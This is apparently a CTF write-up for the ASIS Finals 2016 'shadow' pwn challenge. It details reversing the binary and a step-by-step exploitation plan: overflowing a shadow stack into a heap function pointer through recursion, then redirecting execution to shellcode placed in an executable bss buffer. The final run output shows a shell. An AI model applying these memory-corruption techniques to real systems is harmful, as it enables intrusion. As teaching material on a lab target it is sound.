# ASIS CTF Finals 2016 : shadow-99

**Category:** Pwn
**Points:** 99
**Solves:** 26
**Description:**

Check with the [guard](shadow.txz). Beware, he will not let you in if you are under 18.

nc shadow.asis-ctf.ir 31337

## Write-up

This was a rather unusual exploitation challenge, nevertheless was quite
refreshing and still a lot of fun to solve.
However marking it as a "warm-up" challenge seems a little bit optimistic in my opinion!

As always here are my tools used in this challenge:
* [radare2](https://github.com/radare/radare2)
* [gdb(-peda)](https://github.com/longld/peda)
* [checksec](http://www.trapkit.de/tools/checksec.html).

I won't give a detailed description of the reversing process itself and
just mention the important parts.

Let's start of by running the binary itself:

	$ ./shadow
	Hey, what's your name?
	mightymo
	Welcome!
	menu? I forgot, bro. can you find it?
	no
	invalid menu. bye

Ok it seems like we have to do a litte bit of reversing here...
So we fire up radare:

	$ r2 -A shadow
	...
	[0x08048660]> ! checksec --file shadow
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	No RELRO        Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   shadow


Alright no PIE and no NX, seems like our lucky day!
With a little bit of further reversing we find out that the binary is all about
beers. In the menu we can chose between creating a new beer via '1' or
viewing/modifying an existing beer via '2'. A beer itself is represented with a
struct looking smth. like this:
```C
	struct beerstruct {
		int description_size;
		void (\*repr)(void);
		char \*description;
	}
```
Those beestructs are allocated on the heap with a variable description size.
Note that the second member of the struct is function pointer, which gets
randomly assigned one of four predefined funtions:

	0x080487bb    1 30           sym.hogaarden
	0x080487d9    1 30           sym.paulaner
	0x080487f7    1 30           sym.haineken
	0x08048815    1 30           sym.heinz

I encourage you to play around with the binary a little bit further and reverse
it of your own, as I will now concentrate on the exploiting part of the game.

The first thing you'll notice are the weird looking function calls:

	push sym.beer_counter ; sym.beer_counter
	call fcn.08048e28 ;[c]

Which result from the usage of a shadow-stack. This means instead of the
placing the return instruction pointer (rip) on the regular stack-frame,
it is saved in special memory region called shadow-stack and the address of a
special return-function is placed on the regular stack in it's place.
When a return happens the original rip is fetched from the shadow stack by the return
function and the execution continues.
This is used as a potential counter measure against e.g. buffer
overflow vulnerabilities and kind of the first setback to our lucky day,
but we will see...
It's important to note that the shadow stack is initialized at a fixed address
and grows towards smaller addresses.
You can find the base address of the shadow-stack in the shadow_stack variable
residing at 0x0804a4c0.

Second of all you might notice an out-of-bounds memory read in the sym.beerdesc
function, where the choice of the desired beer is read into memory as:

    lea eax, dword [ebp - local_70h] ;[b]
    push eax
    push str.\_255s ; str.\_255s
    push sym.imp.\__isoc99_scanf ; sym.imp.\__isoc99_scanf

Which basically reads 0xff (255) bytes from stdin to the stack 0x70 above ebp.
You should see the buffer overflow here immediately, remember the executable
stack and get excited for a short moment! ... And then realize you forgot the
canaries... Damn it!

The next thing that leaps out is the huge description size you're allowed to
allocate in the sym.add_one function:

    mov eax, dword [ebp - local_34h]
    cmp eax, 0x100000
    jbe 0x8048919 ;[h]

This is one of the crucial parts of this exploit and you should test this by
yourself! The first thing you might be wondering is that this description size
looks suspiciously big and you might be thinking what happens when you choose
such a description size... So let's just try it:

	$ gdb -q ./shadow
	gdb-peda$ break \*0x080488f8
	Breakpoint 1 at 0x80488f8
	gdb-peda$ b \*0x0804892d
	Breakpoint 2 at 0x804892d
	gdb-peda$ run
	Starting program: /home/moritz/CTF/2016/asis-ctf/files/shadow/shadow
	Hey, what's your name?
	mightymo
	Welcome!
	menu? I forgot, bro. can you find it?
	1
	description length?
	500000
	...
	Breakpoint 1, 0x080488f8 in add_one ()
	gdb-peda$ x/wx 0x0804a4c0
	0x804a4c0 <shadow_stack>:shadow_stack0xf7e06ff8
	gdb-peda$ vmmap
	Start      End        Perm		Name
	0x08048000 0x0804a000 r-xp		/home/moritz/CTF/2016/asis-ctf/files/shadow/shadow
	0x0804a000 0x0804b000 rwxp		/home/moritz/CTF/2016/asis-ctf/files/shadow/shadow
	0xf7dd7000 0xf7e08000 rwxp		mapped
	0xf7e08000 0xf7faf000 r-xp		/lib32/libc-2.19.so
	0xf7faf000 0xf7fb1000 r-xp		/lib32/libc-2.19.so
	0xf7fb1000 0xf7fb2000 rwxp		/lib32/libc-2.19.so
	0xf7fb2000 0xf7fb6000 rwxp		mapped
	0xf7fd8000 0xf7fd9000 rwxp		mapped
	0xf7fd9000 0xf7fdb000 r--p		[vvar]
	0xf7fdb000 0xf7fdc000 r-xp		[vdso]
	0xf7fdc000 0xf7ffc000 r-xp		/lib32/ld-2.19.so
	0xf7ffc000 0xf7ffd000 r-xp		/lib32/ld-2.19.so
	0xf7ffd000 0xf7ffe000 rwxp		/lib32/ld-2.19.so
	0xfffdd000 0xffffe000 rwxp		[stack]
	gdb-peda$ c
	Continuing.
	...
	Breakpoint 2, 0x0804892d in add_one ()
	gdb-peda$ x/wx 0x0804a4c0
	0x804a4c0 <shadow_stack>:shadow_stack0xf7e06ff8
	gdb-peda$ vmmap
	Start      End        Perm		Name
	0x08048000 0x0804a000 r-xp		/home/moritz/CTF/2016/asis-ctf/files/shadow/shadow
	0x0804a000 0x0804b000 rwxp		/home/moritz/CTF/2016/asis-ctf/files/shadow/shadow
	0xf7d5c000 0xf7e08000 rwxp		mapped
	0xf7e08000 0xf7faf000 r-xp		/lib32/libc-2.19.so
	0xf7faf000 0xf7fb1000 r-xp		/lib32/libc-2.19.so
	0xf7fb1000 0xf7fb2000 rwxp		/lib32/libc-2.19.so
	0xf7fb2000 0xf7fb6000 rwxp		mapped
	0xf7fd8000 0xf7fd9000 rwxp		mapped
	0xf7fd9000 0xf7fdb000 r--p		[vvar]
	0xf7fdb000 0xf7fdc000 r-xp		[vdso]
	0xf7fdc000 0xf7ffc000 r-xp		/lib32/ld-2.19.so
	0xf7ffc000 0xf7ffd000 r-xp		/lib32/ld-2.19.so
	0xf7ffd000 0xf7ffe000 rwxp		/lib32/ld-2.19.so
	0xfffdd000 0xffffe000 rwxp		[stack]

I set the breakpoints before and after the malloc call. As you can see the
region just below the code segment was extended. This happens because the size
we wanted to allocate was bigger than the top chunk of the heap could provide.
Thereby a memory region adjacent to the shadow stack is mmaped and returned to
the malloc call.
So we got our heap region just above the shadow-stack, but don't have any
overflow in the beestruct... So the question remains, does this help us in any way?
It turns out it does, but we have to take a closer look to
description size check in the add_one function. Precisely to the false branch:

	0x80488ff
	0x080488ff sub esp, 0xc
	0x08048902 push sym.add_one ; sym.add_one
	0x08048907 call fcn.08048e28 ;[d]
	0x0804890c add esp, 0x10
	0x0804890f mov eax, 0
	0x08048914 jmp 0x80489ff ;[g]
		v
		|
		...
	0x80489ff        
	0x080489ff leave              
    	0x08048a00 ret                

Instead of returning an error or looping, the add_one function is called
recursively. When such a recursive call occurs, the return address is pushed
onto the shadow-stack, letting it grow downwards. You might already know where
this is heading... If we manage to trigger enough recursive calls we will
overflow the mapped shadow-stack area and land right in our heap section.
Thereby we're able to overwrite a beerstruct with return addresses from the
shadow-stack... \o/ ... Well I know this sounds quite esoteric, but it's not
that complicated in practice. Also if you remember correctly the beerstruct
contained a function pointer and this one is called in the sym.beerdesc
function:

    mov eax, dword [ebp - local_78h]      
    mov eax, dword [eax*4 + obj.beerlist]
    mov eax, dword [eax + 4]              
    sub esp, 0xc                          
    push eax                              
    call fcn.08048e28 ;[a]


Alright, by overflowing into the heap we're able to overwrite the function
pointer with a rip and with a subsequent "view" of the particular
beer we can trigger a call to this overwritten function pointer.
So how is this scenario exploitable by us?
In order to understand this, let's have a look at the stack right before the
call:

	+0x4	|     rip	|
	ebp ->	|     ebp	|
	-0x4	|		|
	-0x8	|		|
	-0xc	|    canary	|
	...	|		|
	-0x70	|  scanf buf    |
	-0x74	|		|
	-0x78	|		|
	-0x7c	|		|
	-0x80	|  &ret_func	| <- esp
	-0x7c	|      rip	|

The return-function, which I haven't covered in detail, is responsible for the
top of the stack, but this isn't important for us.
I marked the buffer of the vulnerable scanf call, as well as the canary and the
ebp/rip. If we have a look at the code above starting with instruction at
0x0804890c, the esp moves in the following steps:

1. 0x0804890c add esp, 0x10

		+0x4	|    rip	|
		ebp ->	|    ebp	|
		-0x4	|		|
		-0x8	|		|
		-0xc	|   canary	|
		...	|		|
		-0x70	|  scanf buf 	| <- esp
		-0x74	|		|
		-0x78	|		|
		-0x7c	|		|
		-0x80	|  &ret_func	|  
		-0x7c	|    rip	|

2. 0x080489ff leave

		ebp -> (points to next frame)

		+0x4	|    rip	| <- esp
			|    ebp	|
		-0x4	|		|
		-0x8	|		|
		-0xc	|    canary	|
		...	|		|
		-0x70	|   scanf buf 	|
		-0x74	|		|
		-0x78	|		|
		-0x7c	|		|
		-0x80	|   &ret_func	|  
		-0x7c	|    rip	|


3. 0x08048a00 ret

So now ret is called on the rip without checking the canary beforehand.
Furthermore if you take a closer look you can see that our scanf buffer is right
above this unchecked rip... It seems like we're on the road of victory again!

There's one step missing before we can drink our well deserved beer:
Which address should we use to overwrite the rip and take control over the
execution?
The stack is randomized, so we have two possibilities:

1. Create a ROP-chain using gadgets inside the binary.

2. Find static memory region mapped writeable/executable

I know that the latter sounds some kind of unlikely, but I didn't mention it
without reason! It turns out the bss segment is executable and because it's our
lucky day, the username we get asked for at the beginning is stored exactly
in there, with a max. size of 64 bytes:

	:> is~nickname
	vaddr=0x0804a520 paddr=0x00001520 ord=095 fwd=NONE sz=64 bind=GLOBAL type=OBJECT name=nickname

Note that this address contains a whitespace (0x20) and the nickname is read
with scanf... (read the manpage), so we have to go at least on byte further in
memory.

Finally we have the following game plan:

* In the nickname we insert our shellcode, padded with some NOPs at the beginning
* We create a new beer and chose a description size big enough to be mmaped
  right below our shadow-stack
* We call add_one recurisvely by adding another beer and giving an invalid size
  until we overflow the first beerchunk's function pointer.
* We choose the view option from the menu and when the beerdesc function asks
  for the index, we give an input that sets index 0 and replaces the rip with
  our nickname's address (+4): 0x0804A524
* Finally we sit back and wait for the call

And here is our final exploit in action:

	$ p2 beer_pwn.py
	[+] Starting local process './shadow': Done
	[3522]
	[\*] Paused (press any to continue)
	[\*] Inserting shellcode into nickname
	[\*] Creating heap chunk
	[\*] Overflowing shadow-stack into heap
	[\*] Overflowing rip and triggering function-pointer call
	[\*] Switching to interactive mode
	$ whoami
	mightymo


## Other write-ups and resources

* [Amrita University bi0s](https://amritabi0s.wordpress.com/2016/09/12/asis-finals-2016-shadow-write-up/)
* [KITCTF](https://github.com/kitctf/writeups/blob/master/asis-finals-2016/shadow/solve.py)
